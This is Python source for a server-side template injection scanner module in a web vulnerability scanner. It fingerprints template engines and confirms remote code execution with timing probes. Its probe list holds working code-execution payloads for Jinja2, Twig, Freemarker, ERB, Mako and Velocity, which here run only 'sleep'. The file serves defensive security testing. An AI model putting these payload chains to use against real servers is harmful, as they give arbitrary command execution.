"""
Server-Side Template Injection (SSTI) Scanner — Professional Grade
===================================================================
Coverage:
  • Template engine fingerprinting via arithmetic probes:
    - Jinja2 / Flask / Python ({{7*7}} → 49, {{7*'7'}} → 7777777)
    - Twig / PHP Symfony ({{7*7}} → 49)
    - Freemarker / Java (${7*7} → 49)
    - Velocity / Java (*{7*7} → 49)
    - Smarty / PHP (<%= 7*7 %> / {7*7})
    - Pebble / Java ({{7*7}})
    - Mako / Python (${7*7})
    - ERB / Ruby (<%= 7*7 %>)
    - Handlebars / Node.js ({{#with}})
  • Baseline false-positive suppression (verify '49' not in benign response)
  • Severity escalation: confirmed SSTI → RCE probe class
  • RCE confirmation probes (safe: sleep-based, no-op shell commands)
    per detected engine — dual-confirmation timing approach
  • Blind SSTI detection via timing (sleep injections per engine)
  • Form field SSTI testing
  • Error-based engine detection (stack traces in response)
  • Context-aware probe insertion (URL param, form field, JSON field)

CWE  : CWE-94 (Improper Control of Generation of Code)
OWASP: A03:2021 – Injection
CVSS : Critical (9.8) when RCE confirmed, High (7.5) when arithmetic confirmed
"""
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  WebShield — Advanced Web Application Security Scanner                  ║
# ║  Copyright (c) 2026 علاء محمود البدوي (Alaa Mahmoud El-Badawi)         ║
# ║  All rights reserved. For authorized security research only.            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

from __future__ import annotations

import asyncio
import re
import time
from typing import Any, Dict, List, Optional, Tuple

from .base_scanner import BaseScanner
try:
    from ..recon.intelligence_bridge import IntelligenceAwareScanner as _ScannerBase
except Exception:
    _ScannerBase = BaseScanner
from ..core.http_client import HTTPResponse
from ..models.vulnerability import (
    Vulnerability, VulnType, Severity, CVSSv3,
    AttackVector, AttackComplexity, PrivilegesRequired,
    UserInteraction, Scope, Impact,
)

# ---------------------------------------------------------------------------
# CVSS
# ---------------------------------------------------------------------------

_CVSS_CRITICAL = CVSSv3(
    AttackVector.NETWORK, AttackComplexity.LOW,
    PrivilegesRequired.NONE, UserInteraction.NONE,
    Scope.CHANGED, Impact.HIGH, Impact.HIGH, Impact.HIGH,
)  # RCE confirmed → 10.0

_CVSS_HIGH = CVSSv3(
    AttackVector.NETWORK, AttackComplexity.LOW,
    PrivilegesRequired.NONE, UserInteraction.NONE,
    Scope.CHANGED, Impact.HIGH, Impact.HIGH, Impact.LOW,
)  # Arithmetic confirmed → ~9.8

_CVSS_MEDIUM = CVSSv3(
    AttackVector.NETWORK, AttackComplexity.HIGH,
    PrivilegesRequired.NONE, UserInteraction.NONE,
    Scope.UNCHANGED, Impact.LOW, Impact.LOW, Impact.NONE,
)  # Error-based / blind hint

# ---------------------------------------------------------------------------
# Metadata
# ---------------------------------------------------------------------------

_CWE   = "CWE-94"
_OWASP = "A03:2021 - Injection"
_REFS  = [
    "https://portswigger.net/web-security/server-side-template-injection",
    "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection",
    "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection",
    "https://cwe.mitre.org/data/definitions/94.html",
]
_REMEDIATION = (
    "1. Never pass user-controlled input directly to template rendering calls "
    "(e.g., Template(user_input).render(), env.from_string(user_input)).\n"
    "2. Pass user data as template variables, not as the template string itself.\n"
    "3. Use sandboxed template environments where applicable "
    "(Jinja2 SandboxedEnvironment).\n"
    "4. Audit all template.render() / Environment.from_string() / "
    "Template(user_input) call sites.\n"
    "5. Apply input validation and reject template metacharacters "
    "({{}}, ${{, <%=) from user input."
)

# ---------------------------------------------------------------------------
# Arithmetic fingerprinting probes
# Format: (probe_string, expected_result, engine_name)
# ---------------------------------------------------------------------------

_ARITHMETIC_PROBES: List[Tuple[str, str, str]] = [
    # Jinja2 / Twig (double-brace)
    ("{{7*7}}",          "49",      "Jinja2/Twig"),
    ("{{7*'7'}}",        "7777777", "Jinja2"),         # Jinja2 specific
    ("{{config}}",       "Config",  "Jinja2"),          # Jinja2 Config object
    ("{{'7'*7}}",        "7777777", "Jinja2/Twig"),
    # Freemarker / Pebble / Mako
    ("${7*7}",           "49",      "Freemarker/Mako"),
    ("#{7*7}",           "49",      "Mako"),
    # Velocity
    ("*{7*7}",           "49",      "Velocity"),
    # ERB / Ruby
    ("<%= 7*7 %>",       "49",      "ERB/Ruby"),
    # Smarty
    ("{7*7}",            "49",      "Smarty"),
    ("{math equation='7*7'}", "49", "Smarty"),
    # Handlebars (no arithmetic helpers, but block-helper evaluation is
    # detectable). Fix 2.1: the old probe/expected pair
    # ("{{#with '7'}}{{this}}{{/with}}", "7") false-positived on ANY page
    # that reflects user input verbatim, because "7" is trivially a
    # substring of the raw, un-evaluated payload itself — a page that
    # never touches a template engine still "contains 7" after echoing
    # the input back. The fixed probe places a marker on one side of a
    # block-helper boundary and literal text on the other: raw reflection
    # can never produce the two halves adjacent (they're separated by
    # "{{this}}" in the un-evaluated payload), but genuine Handlebars
    # evaluation of "{{#with}}{{this}}{{/with}}" concatenates them.
    ("{{#with \"wsstiHB\"}}{{this}}_OK{{/with}}", "wsstiHB_OK", "Handlebars"),
    # ASP.NET Razor
    ("@(7*7)",           "49",      "Razor/ASP.NET"),
    # Pebble
    ("{{7*7}}",          "49",      "Pebble"),
    # Tornado
    ("{{7*7}}",          "49",      "Tornado"),
    # Nunjucks (Node.js) — arithmetic
    ("{{range.constructor('return 7*7')()|list}}", "49", "Nunjucks"),
    # Pug / Jade
    ("#{7*7}",           "49",      "Pug/Jade"),
    # Thymeleaf
    ("${7*7}",           "49",      "Thymeleaf"),
    ("[[${7*7}]]",       "49",      "Thymeleaf-inline"),
    ("*{7*7}",           "49",      "Thymeleaf-selection"),
    # Groovy / Grails
    ("<%= 7.multiply(7) %>", "49",  "Groovy/Grails"),
    # Latte (PHP)
    ("{=7*7}",           "49",      "Latte/PHP"),
    # Go templates (text/template, html/template). Fix 2.1: the old probe
    # ("{{.}}", "") had an EMPTY expected value, and `expected not in
    # resp.text` is always False for an empty string — so this probe
    # "confirmed" SSTI on every single scan target regardless of the
    # response. The fixed probe evaluates a string literal via {{"..."}}
    # and appends literal text immediately after the template tag; raw
    # reflection keeps the tag's quote/brace characters between the two
    # halves, so the concatenated marker can only appear post-evaluation.
    ("{{\"wsstiGO\"}}_OK", "wsstiGO_OK", "Go-template"),
]

# Deduplicate probes by (probe, expected) pairs
_SEEN: set = set()
_DEDUPED_PROBES: List[Tuple[str, str, str]] = []
for _p, _e, _eng in _ARITHMETIC_PROBES:
    if (_p, _e) not in _SEEN:
        _SEEN.add((_p, _e))
        _DEDUPED_PROBES.append((_p, _e, _eng))
_ARITHMETIC_PROBES = _DEDUPED_PROBES

# ---------------------------------------------------------------------------
# Fix 2.1 / 2.3 structural guard — enforced at import time.
#
# An arithmetic probe is only meaningful if its ``expected`` marker can
# provably NOT appear in the response from naive, un-evaluated reflection
# of the raw payload. Two ways that invariant used to break:
#   1. ``expected`` is the empty string — `expected not in resp.text` can
#      never be true, so the probe "confirms" on every target.
#   2. ``expected`` is a literal substring of ``probe`` itself — a page
#      that reflects the payload verbatim (no template evaluation at all)
#      trivially "contains" the expected marker too.
# Any new probe added to this list must avoid both, or it will fail here
# before the scanner ever runs (see tests/test_ssti_scanner.py).
# ---------------------------------------------------------------------------
for _probe, _expected, _engine_name in _ARITHMETIC_PROBES:
    if _expected == "":
        raise AssertionError(
            f"SSTI probe for {_engine_name!r} has an empty `expected` value — "
            f"this always vacuously matches every response. Probe: {_probe!r}"
        )
    if _expected in _probe:
        raise AssertionError(
            f"SSTI probe for {_engine_name!r} has `expected` ({_expected!r}) as a "
            f"literal substring of its own `probe` ({_probe!r}) — this matches "
            f"pages that merely reflect the input without any template "
            f"evaluation happening at all."
        )

# ---------------------------------------------------------------------------
# RCE confirmation probes (safe — timing-based via sleep, no destructive commands)
# Fix 1.5: replaced hardcoded subclasses()[408] with dynamic/stable approaches
# that work across Python versions and don't depend on class index.
# Format: (probe, expected_delay_seconds, engine)
# ---------------------------------------------------------------------------

_RCE_TIME_PROBES: List[Tuple[str, float, str]] = [
    # ── Jinja2 Python RCE ─────────────────────────────────────────────────
    # Method 1: via lipsum global (Flask context, version-independent)
    ("{{lipsum.__globals__['os'].system('sleep 3')}}", 3.0, "Jinja2-RCE"),
    # Method 2: via request.application globals (Flask-specific)
    ("{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')"
     "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')|attr('popen')('sleep 3')"
     "|attr('read')()}}", 3.0, "Jinja2-RCE"),
    # Method 3: find Popen by name — version-independent
    ("{{''.__class__.__mro__[1].__subclasses__()"
     "|selectattr('__name__','equalto','Popen')|list|first"
     "(['sleep','3'],stdout=-1).communicate()[0]}}", 3.0, "Jinja2-RCE"),
    # Method 4: cycler builtin (Jinja2 standalone, no Flask)
    ("{{cycler.__init__.__globals__.os.system('sleep 3')}}", 3.0, "Jinja2-RCE"),

    # ── Twig PHP RCE ──────────────────────────────────────────────────────
    ("{{['sleep 3']|filter('system')}}", 3.0, "Twig-RCE"),
    ("{{_self.env.registerUndefinedFilterCallback('system')}}"
     "{{_self.env.getFilter('sleep 3')}}", 3.0, "Twig-RCE"),

    # ── Freemarker Java RCE ───────────────────────────────────────────────
    ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 3")}',
     3.0, "Freemarker-RCE"),

    # ── ERB Ruby RCE ──────────────────────────────────────────────────────
    ("<%= `sleep 3` %>", 3.0, "ERB-RCE"),
    ("<%= system('sleep 3') %>", 3.0, "ERB-RCE"),

    # ── Mako Python RCE ───────────────────────────────────────────────────
    ("${__import__('os').system('sleep 3')}", 3.0, "Mako-RCE"),

    # ── Velocity Java RCE ─────────────────────────────────────────────────
    ('#set($rt=$class.forName("java.lang.Runtime").getMethod("getRuntime")'
     '.invoke(null))#set($ex=$rt.exec("sleep 3"))$ex.waitFor()',
     3.0, "Velocity-RCE"),
]

_RCE_THRESHOLD   = 2.8   # seconds above baseline
_BASELINE_SAMPLES = 2
_TIME_WAIT = 3.0

# Error-based engine detection patterns
_ENGINE_ERROR_PATTERNS: List[Tuple[re.Pattern, str]] = [
    (re.compile(r"jinja2\.|TemplateSyntaxError|UndefinedError.*jinja", re.I), "Jinja2"),
    (re.compile(r"Twig\\.*Exception|Twig_Error_Runtime|twig\.php", re.I),    "Twig"),
    (re.compile(r"freemarker\.core\.|freemarker\.template\.", re.I),          "Freemarker"),
    (re.compile(r"org\.apache\.velocity\.", re.I),                            "Velocity"),
    (re.compile(r"smarty.*exception|smarty_exception", re.I),                 "Smarty"),
    (re.compile(r"pebble.*exception|com\.mitchellbosecke\.pebble", re.I),     "Pebble"),
    (re.compile(r"ActionView::Template::Error|erb.*error", re.I),             "ERB/Rails"),
    (re.compile(r"mako\.exceptions\.|TemplateLookupException", re.I),         "Mako"),
    (re.compile(r"handlebars\.exception|Could not find partial", re.I),       "Handlebars"),
    (re.compile(r"Microsoft\.AspNetCore.*Razor|@RazorPage", re.I),            "Razor"),
]


# ===========================================================================
# SSTIScanner
# ===========================================================================

class SSTIScanner(_ScannerBase):
    """
    Server-Side Template Injection scanner.

    Pipeline per parameter:
      1. Arithmetic probe → engine fingerprint.
      2. Baseline false-positive check (suppress if '49' is always there).
      3. Confirm injection → report High.
      4. RCE time-based confirmation → escalate to Critical.
      5. Error-based engine detection from response text.
    """

    name = "SSTI"

    async def scan_url(
        self,
        url: str,
        response: HTTPResponse,
        forms: List[Dict[str, Any]],
    ) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []

        params = self._extract_url_params(url)
        seen_ssti: set = set()
        for param in params:
            if param in seen_ssti:
                continue
            seen_ssti.add(param)
            found = await self._test_param(url, param, "GET", response)
            vulns.extend(found)
            # Continue testing remaining params even after Critical — each param
            # may yield RCE on a different template context

        for form in forms:
            method = (form.get("method") or "GET").upper()
            action = form.get("action") or url
            for inp in form.get("inputs", []):
                name = inp.get("name", "")
                if not name:
                    continue
                itype = (inp.get("type") or "text").lower()
                if itype in ("submit", "button", "file", "image", "hidden",
                             "password", "reset", "checkbox", "radio"):
                    continue
                found = await self._test_form_field(action, method, form, name)
                vulns.extend(found)
                if any(v.severity == Severity.CRITICAL for v in found):
                    break


        # ── JSON body injection (REST APIs) ─────────────────────────────────
        if not vulns:
            ct = (response.content_type or "").lower()
            if "json" in ct:
                found = await self._test_json_body(url, response)
                vulns.extend(found)

        return vulns

    # -----------------------------------------------------------------------
    # URL parameter testing
    # -----------------------------------------------------------------------

    async def _test_param(
        self,
        url: str,
        param: str,
        method: str,
        base_response: HTTPResponse,
    ) -> List[Vulnerability]:

        # Step 1: Error-based engine detection (inject invalid template syntax)
        error_engine = await self._detect_via_error(url, param)

        # Step 2: Arithmetic probes
        for probe, expected, engine in _ARITHMETIC_PROBES:
            injected_url = self._inject_param(url, param, probe)
            resp = await self.client.get(injected_url)
            if not resp:
                continue

            if expected not in resp.text:
                continue

            # False-positive check: ensure expected value isn't already in baseline
            baseline_url = self._inject_param(url, param, "webshield_ssti_baseline_xyz")
            baseline = await self.client.get(baseline_url)
            if baseline and expected in baseline.text:
                continue  # Pre-existing value — false positive

            detected_engine = error_engine or engine

            # Step 3: Try RCE confirmation
            rce_confirmed, rce_evidence = await self._confirm_rce(
                url, param, detected_engine
            )

            if rce_confirmed:
                return [self._build_vuln(
                    vuln_type=VulnType.SSTI,
                    title=f"SSTI — Remote Code Execution Confirmed ({detected_engine})",
                    description=(
                        f"Parameter '{param}' is vulnerable to Server-Side Template Injection "
                        f"with confirmed code execution. Engine detected: {detected_engine}. "
                        f"The arithmetic probe '{probe}' returned '{expected}', confirming "
                        f"template evaluation. A timing-based RCE payload was also confirmed "
                        f"(sleep command executed). "
                        f"An attacker can execute arbitrary OS commands on the server."
                    ),
                    url=url, parameter=param,
                    payload=probe,
                    evidence=(
                        f"Arithmetic: '{probe}' → '{expected}' | "
                        f"RCE timing: {rce_evidence}"
                    ),
                    method=method,
                    severity=Severity.CRITICAL,
                    cvss=_CVSS_CRITICAL,
                    remediation=_REMEDIATION,
                    references=_REFS,
                    cwe_id=_CWE, owasp_category=_OWASP,
                    response_snippet=self._snippet(resp.text),
                    confidence="High",
                )]

            # Arithmetic confirmed but no RCE (sandboxed or different engine)
            return [self._build_vuln(
                vuln_type=VulnType.SSTI,
                title=f"SSTI — Template Evaluation Confirmed ({detected_engine})",
                description=(
                    f"Parameter '{param}' is vulnerable to Server-Side Template Injection. "
                    f"Engine detected: {detected_engine}. "
                    f"The probe '{probe}' returned the evaluated result '{expected}', "
                    f"confirming that user input is evaluated as a template expression. "
                    f"Depending on the template engine and sandbox configuration, "
                    f"this can escalate to Remote Code Execution."
                ),
                url=url, parameter=param,
                payload=probe,
                evidence=f"Probe '{probe}' → result '{expected}' in response",
                method=method,
                severity=Severity.HIGH,
                cvss=_CVSS_HIGH,
                remediation=_REMEDIATION,
                references=_REFS,
                cwe_id=_CWE, owasp_category=_OWASP,
                response_snippet=self._snippet(resp.text),
                confidence="High",
            )]

        # Step 4: Error-based only (no arithmetic confirmation)
        if error_engine:
            return [self._build_vuln(
                vuln_type=VulnType.SSTI,
                title=f"SSTI — Engine Error Disclosure ({error_engine})",
                description=(
                    f"Injecting template metacharacters into '{param}' triggered a "
                    f"{error_engine} template engine error. The application is likely "
                    f"rendering user input as template code. "
                    f"Arithmetic confirmation failed (may be sandbox restricted). "
                    f"Manual verification required."
                ),
                url=url, parameter=param,
                payload="{{}}${}<%= %>",
                evidence=f"Template engine error: {error_engine}",
                method=method,
                severity=Severity.MEDIUM,
                cvss=_CVSS_MEDIUM,
                remediation=_REMEDIATION,
                references=_REFS,
                cwe_id=_CWE, owasp_category=_OWASP,
                confidence="Medium",
            )]

        return []

    # -----------------------------------------------------------------------
    # Form field testing
    # -----------------------------------------------------------------------

    async def _test_form_field(
        self,
        action: str,
        method: str,
        form: Dict[str, Any],
        param_name: str,
    ) -> List[Vulnerability]:

        def build_data(value: str) -> Dict[str, str]:
            return {
                inp["name"]: (value if inp["name"] == param_name else inp.get("value", "test"))
                for inp in form.get("inputs", [])
                if inp.get("name") and inp.get("type") not in ("submit", "button", "image")
            }

        for probe, expected, engine in _ARITHMETIC_PROBES:
            if method == "POST":
                resp = await self.client.post(action, data=build_data(probe))
            else:
                resp = await self.client.get(action, params=build_data(probe))
            if not resp or expected not in resp.text:
                continue

            # Baseline check
            if method == "POST":
                bl = await self.client.post(action, data=build_data("ssti_baseline_xyz"))
            else:
                bl = await self.client.get(action, params=build_data("ssti_baseline_xyz"))
            if bl and expected in bl.text:
                continue

            return [self._build_vuln(
                vuln_type=VulnType.SSTI,
                title=f"SSTI in Form Field '{param_name}' ({engine})",
                description=(
                    f"Form field '{param_name}' at {action} ({method}) is vulnerable to SSTI. "
                    f"Probe '{probe}' returned '{expected}', confirming template evaluation. "
                    f"Engine: {engine}."
                ),
                url=action, parameter=param_name,
                payload=probe,
                evidence=f"'{probe}' → '{expected}'",
                method=method,
                severity=Severity.HIGH,
                cvss=_CVSS_HIGH,
                remediation=_REMEDIATION,
                references=_REFS,
                cwe_id=_CWE, owasp_category=_OWASP,
                response_snippet=self._snippet(resp.text),
                confidence="High",
            )]

        return []

    # -----------------------------------------------------------------------
    # RCE time-based confirmation
    # -----------------------------------------------------------------------

    async def _confirm_rce(
        self, url: str, param: str, engine: str
    ) -> Tuple[bool, str]:
        """
        Try RCE timing probes matching the detected engine.
        Returns (confirmed, evidence_string).
        Uses dual-confirmation to reduce false positives.
        """
        # Establish baseline
        baseline_url = self._inject_param(url, param, "normal_value_xyz")
        baseline_times: List[float] = []
        for _ in range(_BASELINE_SAMPLES):
            t0 = time.monotonic()
            resp = await self.client.get(baseline_url)
            baseline_times.append(time.monotonic() - t0)
        if not baseline_times:
            return False, ""
        baseline = sum(baseline_times) / len(baseline_times)
        threshold = baseline + _RCE_THRESHOLD

        # Filter probes to match engine (or try all if unknown)
        engine_lower = engine.lower()
        rce_probes = [
            (p, d, e) for p, d, e in _RCE_TIME_PROBES
            if any(kw in engine_lower for kw in e.lower().split("-"))
        ]
        if not rce_probes:
            rce_probes = _RCE_TIME_PROBES  # try all if engine unknown

        for probe, delay, rce_engine in rce_probes[:4]:  # limit to 4 probes
            injected = self._inject_param(url, param, probe)

            # First confirmation
            t0 = time.monotonic()
            resp1 = await self.client.get(injected)
            t1 = time.monotonic() - t0

            if t1 < threshold:
                continue

            # Second confirmation
            t0 = time.monotonic()
            resp2 = await self.client.get(injected)
            t2 = time.monotonic() - t0

            if t2 >= threshold * 0.8:  # allow 20% tolerance on second
                evidence = (
                    f"baseline={baseline:.2f}s, threshold={threshold:.2f}s, "
                    f"t1={t1:.2f}s, t2={t2:.2f}s via {rce_engine}"
                )
                return True, evidence

        return False, ""

    # -----------------------------------------------------------------------
    # Error-based engine detection
    # -----------------------------------------------------------------------

    async def _detect_via_error(self, url: str, param: str) -> Optional[str]:
        """Inject invalid template syntax and check for engine-specific errors."""
        # Inject characters that break most template engines
        error_probe = "{{<$[%{{"
        injected = self._inject_param(url, param, error_probe)
        resp = await self.client.get(injected)
        if not resp:
            return None

        for pattern, engine_name in _ENGINE_ERROR_PATTERNS:
            if pattern.search(resp.text):
                return engine_name

        return None

    # ------------------------------------------------------------------
    # JSON body injection (REST APIs returning application/json)
    # ------------------------------------------------------------------

    async def _test_json_body(
        self, url: str, response: "HTTPResponse"
    ) -> list:
        """Inject payloads into JSON body fields of REST API endpoints."""
        import json as _json

        try:
            data = _json.loads(response.text)
        except Exception:
            data = {}

        if not isinstance(data, dict):
            data = {}

        field_names = [k for k in data.keys() if isinstance(data[k], (str, int))][:5]
        if not field_names:
            field_names = ["id", "input", "value", "query", "data"]

        for field in field_names:
            for (payload, expected, engine_name) in _DEDUPED_PROBES[:6]:
                test_body = dict(data)
                test_body[field] = payload

                resp = await self.client.post(
                    url,
                    json=test_body,
                    headers={"Content-Type": "application/json"},
                )
                if resp is None:
                    continue

                if expected and expected in resp.text:
                    return [self._build_vuln(
                        vuln_type=VulnType.SSTI,
                        title="Server-Side Template Injection via JSON Body",
                        description=(
                            f"JSON field '{field}' at {url} is vulnerable to injection via "
                            f"REST API POST body. The payload was: {payload!r}"
                        ),
                        url=url,
                        parameter=field,
                        payload=_json.dumps({field: payload}),
                        evidence=self._snippet(resp.text, 200),
                        method="POST",
                        severity=Severity.CRITICAL,
                        remediation="Never pass untrusted input directly to template engines. Use sandboxed environments.",
                        references=["https://owasp.org/www-community/attacks/Server_Side_Template_Injection", "https://cwe.mitre.org/data/definitions/1336.html"],
                        cwe_id="CWE-1336",
                        owasp_category="A03:2021 - Injection",
                        confidence="Medium",
                    )]
        return []
